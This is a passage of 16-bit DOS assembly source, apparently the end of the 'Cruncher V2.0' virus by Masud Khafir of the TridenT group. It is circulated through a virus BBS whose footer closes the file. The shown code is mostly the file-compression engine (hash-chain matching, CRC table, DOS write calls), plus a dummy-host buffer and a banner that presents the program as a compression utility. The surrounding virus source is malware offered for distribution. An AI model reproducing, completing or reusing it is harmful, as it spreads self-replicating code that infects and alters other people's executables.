                cmp     cx,4
                jne     loc_230
                clc
                call    sub_23
                stc
                call    sub_23
                jmp     loc_236
loc_230:
                cmp     cx,5
                jne     loc_231
                clc
                call    sub_23
                clc
                call    sub_23
                stc
                call    sub_23
                jmp     loc_236
loc_231:
                cmp     cx,6
                jne     loc_232
                clc
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                stc
                call    sub_23
                jmp     loc_236
loc_232:
                cmp     cx,7
                jne     loc_233
                clc
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                stc
                call    sub_23
                clc
                call    sub_23
                jmp     short loc_236
loc_233:
                cmp     cx,8
                jne     loc_234
                clc
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                stc
                call    sub_23
                stc
                call    sub_23
                jmp     short loc_236
loc_234:
                cmp     cx,10h
                ja      loc_235
                mov     bh,cl
                sub     bh,9
                push    cx
                mov     cl,5
                shl     bh,cl
                clc
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                shl     bh,1
                call    sub_23
                shl     bh,1
                call    sub_23
                shl     bh,1
                call    sub_23
                pop     cx
                jmp     short loc_236
                jmp     short loc_236
loc_235:
                clc
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                clc
                call    sub_23
                stc
                call    sub_23
                mov     ax,cx
                sub     ax,11h
                stosb
loc_236:
                cmp     si,0E000h
                jbe     loc_238
                cmp     byte ptr cs:data_172,0
                jne     loc_237
                clc
                call    sub_23
                clc
                call    sub_23
                mov     al,0FFh
                stosb
                clc
                call    sub_23
                stc
                call    sub_23
loc_237:
                mov     ax,ds
                add     ax,0C00h
                mov     ds,ax
                call    sub_25
                sub     si,0C000h
loc_238:
                cmp     di,0F810
                jbe     loc_240
                push    ds
                push    bp
                push    dx
                push    cx
                mov     cx,cs:data_168
                cmp     cx,0F800h
                jbe     loc_239
                mov     cx,1800h
                call    sub_22
loc_239:
                pop     cx
                pop     dx
                pop     bp
                pop     ds
loc_240:
                mov     ax,si
                and     ax,0F000h
                cmp     ax,cs:data_171
                je      loc_241
                mov     cs:data_171,ax
loc_241:
                mov     ax,cs:data_167
                sub     ax,cx
                mov     cs:data_167,ax
                sbb     cs:data_166,0
                jnz     loc_242
                or      ah,ah
                jnz     loc_242
                mov     dh,al
                or      al,al
                jz      loc_243
loc_242:
                jmp     loc_220
loc_243:
                clc
                call    sub_23
                clc
                call    sub_23
                mov     al,0FFh
                stosb
                clc
                call    sub_23
                clc
                call    sub_23
loc_244:
                shr     bp,1
                dec     dl
                jnz     loc_244
                push    di
                mov     di,cs:data_168
                mov     es:[di],bp
                pop     di
                mov     cx,di
                sub     cx,0E000h
                call    sub_22
                mov     dx,cs:data_169
                mov     ax,cs:data_170
                mov     bx,cs:data_163
loc_245:
                cli
                mov     ss,cs:[save_stack]
                mov     sp,cs:[save_stack+2]
                sti
                pop     si
                pop     di
                pop     bp
                ret
diet            endp


;---------------------------------------------------------------------
;
;---------------------------------------------------------------------

sub_22          proc    near
                push    es
                pop     ds
                push    di
                push    cx
                mov     ax,cs:data_163
                mov     bp,0FE00
                mov     bx,0E000
                jcxz    loc_248

locloop_247:
                xor     al,[bx]
                inc     bx
                mov     dl,al
                xor     dh,dh
                mov     al,ah
                xor     ah,ah
                shl     dx,1
                mov     di,dx
                xor     ax,[bp+di]
                loop    locloop_247

loc_248:
                mov     cs:data_163,ax
                pop     cx
                pop     di
                mov     dx,0E000
                mov     bx,word ptr cs:[handle]
                mov     ah,40h
                int     21h
                jc      loc_250
                cmp     ax,cx
                jne     loc_250
                add     cs:data_170,ax
                adc     cs:data_169,0
                sub     di,cx
                sub     cs:data_168,cx
                push    cx
                mov     bx,dx
                mov     cx,10h

locloop_249:
                mov     ax,ds:[bx+1800]
                mov     [bx],ax
                inc     bx
                inc     bx
                loop    locloop_249

                pop     cx
                ret
loc_250:
                mov     ax,0FFFFh
                cwd
                jmp     loc_245
sub_22          endp


;---------------------------------------------------------------------
;
;---------------------------------------------------------------------

sub_23          proc    near
                rcr     bp,1
                dec     dl
                jnz     loc_ret_251
                push    di
                xchg    di,cs:data_168
                mov     es:[di],bp
                mov     dl,10h
                pop     di
                inc     di
                inc     di

loc_ret_251:
                ret
sub_23          endp


;---------------------------------------------------------------------
;
;---------------------------------------------------------------------

sub_24          proc    near
                xor     bp,bp
                xor     bx,bx
                mov     cx,7000h

locloop_252:
                mov     [bp],bx
                inc     bp
                inc     bp
                loop    locloop_252

                mov     bp,0FE00
                xor     di,di
                xor     dx,dx
loc_253:
                mov     ax,dx
                mov     cx,8

locloop_254:
                shr     ax,1
                jnc     loc_255
                xor     ax,0A001h
loc_255:
                loop    locloop_254

                mov     [bp+di],ax
                inc     di
                inc     di
                inc     dl
                jnz     loc_253
                ret
sub_24          endp


;---------------------------------------------------------------------
;
;---------------------------------------------------------------------

sub_25          proc    near
                push    bp
                push    cx
                mov     bp,8000
                mov     cx,2000h

locloop_256:
                mov     bx,[bp]
                mov     ax,bx
                sub     ax,si
                cmp     ax,0E000h
                jb      loc_257
                sub     bx,0C000h
                jmp     short loc_258
loc_257:
                xor     bx,bx
loc_258:
                mov     [bp],bx
                inc     bp
                inc     bp
                loop    locloop_256

                pop     cx
                pop     bp
                ret
sub_25          endp


;---------------------------------------------------------------------
;
;---------------------------------------------------------------------

sub_26          proc    near
                lodsw
                dec     si
                mov     cx,103h
                mov     bp,ax
                shr     bp,cl
                mov     cl,al
                and     cl,7
                shl     ch,cl
                test    ch,[bp-4000h]
                pushf
                or      [bp-4000h],ch
                and     ah,1Fh
                shl     ax,1
                mov     bp,ax
                mov     cx,[bp-8000h]
                mov     [bp-8000h],si
                jcxz    loc_259
                sub     cx,si
                cmp     cx,0E000h
                jae     loc_259
                xor     cx,cx
loc_259:
                mov     bp,si
                shl     bp,1
                and     bp,3FFFh
                mov     [bp],cx
                popf
                jnz     loc_260
                xor     cx,cx
                mov     [bp+4000h],cx
                ret
loc_260:
                push    bp
                lodsb
                mov     di,si
                dec     si
loc_261:
                dec     di
                mov     cx,[bp]
                add     di,cx
                shl     cx,1
                jz      loc_262
                add     bp,cx
                and     bp,3FFFh
                mov     cx,di
                sub     cx,si
                cmp     cx,0E000h
                jb      loc_263
                scasb
                jnz     loc_261
                cmp     di,si
                jae     loc_261
loc_262:
                pop     bp
                mov     [bp+4000h],cx
                or      cx,cx
                ret
loc_263:
                xor     cx,cx
                jmp     short loc_262
sub_26          endp


;---------------------------------------------------------------------
;
;---------------------------------------------------------------------

sub_27          proc    near
                push    es
                push    bp
                push    di
                push    dx
                push    ds
                pop     es
                call    sub_26
                mov     bx,cx
                mov     ax,1
                jnz     loc_264
                jmp     loc_276
loc_264:
                push    bp
                mov     cx,103h
                mov     ax,[si]
                mov     bp,ax
                shr     bp,cl
                mov     cl,al
                and     cl,7
                shl     ch,cl
                test    ch,[bp-4000h]
                pop     bp
                mov     ax,2
                jz      loc_272
                mov     dx,si
                inc     si
                mov     di,si
                xor     ax,ax
                jmp     short loc_266
loc_265:
                pop     di
                pop     si
loc_266:
                mov     cx,[bp+4000h]
                add     di,cx
                shl     cx,1
                jz      loc_271
                add     bp,cx
                and     bp,3FFFh
                mov     cx,di
                sub     cx,si
                cmp     cx,0E000h
                jb      loc_271
                push    si
                push    di
                mov     cx,ax
                jcxz    loc_267
                repe    cmpsb
                jnz     loc_265
                cmp     di,dx
                jae     loc_265
loc_267:
                inc     ax
                cmpsb
                jnz     loc_270
loc_268:
                cmp     di,dx
                jae     loc_270
                inc     ax
                cmp     ax,10Fh
                jb      loc_269
                mov     ax,10Fh
                pop     di
                pop     si
                mov     bx,di
                sub     bx,si
                jmp     short loc_271
loc_269:
                cmpsb
                jz      loc_268
loc_270:
                pop     di
                pop     si
                mov     bx,di
                sub     bx,si
                jmp     short loc_266
loc_271:
                mov     si,dx
                inc     ax
loc_272:
                xor     cx,cx
                cmp     cs:data_166,cx
                jne     loc_273
                cmp     cs:data_167,ax
                jae     loc_273
                mov     ax,cs:data_167
loc_273:
                cmp     ax,2
                jb      loc_276
                jnz     loc_274
                cmp     bx,0F700h
                jae     loc_274
                dec     ax
                jmp     short loc_276
loc_274:
                push    ax
                mov     cx,ax
                dec     cx

locloop_275:
                push    cx
                call    sub_26
                pop     cx
                loop    locloop_275

                pop     ax
loc_276:
                pop     dx
                pop     di
                pop     bp
                pop     es
                ret
sub_27          endp


;---------------------------------------------------------------------------
;               buffer + text
;---------------------------------------------------------------------------

buffer          db      0CDh, 20                ;original code of dummy program
                db      (BUFLEN-2) dup (?)

printme         db      7, 0Dh, 0A
                db      'ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»', 0Dh, 0A
                db      'º *** CRUNCHER V2.0 ***   Automatic file compression utility º', 0Dh, 0A
                db      'º Written by Masud Khafir of the TridenT group  (c) 31/12/92 º', 0Dh, 0A
                db      'º Greetings to Fred Cohen, Light Avenger and Teddy Matsumoto º', 0Dh, 0A
                db      'ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼', 0Dh, 0A
                db      '$'

last:

_TEXT           ends
                end    first

;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄ> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <ÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
